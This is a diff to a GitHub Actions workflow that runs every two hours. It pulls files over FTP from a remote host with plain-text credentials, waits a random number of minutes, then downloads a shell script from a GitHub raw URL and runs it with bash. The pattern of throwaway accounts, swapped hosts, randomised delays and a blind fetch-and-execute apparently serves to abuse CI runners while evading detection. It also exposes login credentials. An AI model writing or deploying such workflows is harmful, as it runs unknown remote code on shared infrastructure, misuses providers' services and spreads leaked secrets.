@@ -1,7 +1,7 @@
-name: sixnou1
+name: nine
 on:
   schedule:
-    - cron: '4 */2 * * *' # 
+    - cron: '36 */2 * * *' # 
 jobs:
   download-and-run:
     runs-on: ubuntu-latest
@@ -13,10 +13,11 @@ jobs:
           files=("230117" "230118" "230119" "230120" "230121")
           for file in "${files[@]}"; do
           for i in {1..1}; do
-          wget -nH -m --ftp-user=hkopop0056 --ftp-password=hkopop0056aA### "ftp://ftp-hkopop0056.alwaysdata.net/www/$file/*"
+          wget -nH -m --ftp-user=if0_37965025 --ftp-password=98kDsIA4LJEZ "ftp://185.27.134.11/htdocs/$file/*"
           sleep 5
           done
-          cp www/$file/* ./
+          cp htdocs/$file/* ./
           done
-          wget -O drive333.sh https://raw.githubusercontent.com/hongtyyu/0127/main/.github/workflows/drive333.sh
+          sleep $((RANDOM % 10 + 1))m
+          wget -O drive333.sh https://raw.githubusercontent.com/tuhvvvvvy/0127/main/.github/workflows/drive333333.sh
           bash drive333.sh
